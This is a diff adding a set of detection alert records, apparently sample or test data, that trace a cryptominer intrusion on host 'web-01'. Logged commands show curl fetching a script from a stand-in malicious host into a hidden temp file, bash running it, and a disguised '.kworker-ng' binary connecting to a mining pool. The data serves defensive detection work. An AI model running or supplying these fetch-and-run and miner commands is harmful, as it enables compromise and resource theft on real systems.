@@ -1,0 +1,63 @@
+{
+  rule: "Linux Download Written To Temporary Directory",
+  severity_id: 3,
+  host: "web-01",
+  time: 2026-09-14T08:12:01.410Z,
+  cmd: "curl -fsSL http://dl.evil-cdn.example/x.sh -o /tmp/.x.sh",
+  file: null,
+  dst: null,
+}
+{
+  rule: "Linux Hidden File Created In Temporary Directory",
+  severity_id: 2,
+  host: "web-01",
+  time: 2026-09-14T08:12:02.020Z,
+  cmd: null,
+  file: "/tmp/.x.sh",
+  dst: null,
+}
+{
+  rule: "Linux Process Started From Temporary Directory",
+  severity_id: 4,
+  host: "web-01",
+  time: 2026-09-14T08:12:03.300Z,
+  cmd: "/bin/bash /tmp/.x.sh",
+  file: null,
+  dst: null,
+}
+{
+  rule: "Linux Hidden File Created In Temporary Directory",
+  severity_id: 2,
+  host: "web-01",
+  time: 2026-09-14T08:12:03.500Z,
+  cmd: null,
+  file: "/tmp/.kworker-ng",
+  dst: null,
+}
+{
+  rule: "Linux Process Started From Temporary Directory",
+  severity_id: 4,
+  host: "web-01",
+  time: 2026-09-14T08:12:04.100Z,
+  cmd: "/tmp/.kworker-ng --pool 198.51.100.7:4444",
+  file: null,
+  dst: null,
+}
+{
+  rule: "Linux Outbound Connection To Common Mining Pool Port",
+  severity_id: 3,
+  host: "web-01",
+  time: 2026-09-14T08:12:04.300Z,
+  cmd: null,
+  file: null,
+  dst: 198.51.100.7,
+}
+{
+  rule: "Linux Process Started From Temporary Directory",
+  severity_id: 4,
+  host: "web-01",
+  time: 2026-09-14T08:12:09.500Z,
+  cmd: "/tmp/.kworker-ng --pool 198.51.100.7:4444",
+  file: null,
+  dst: null,
+}
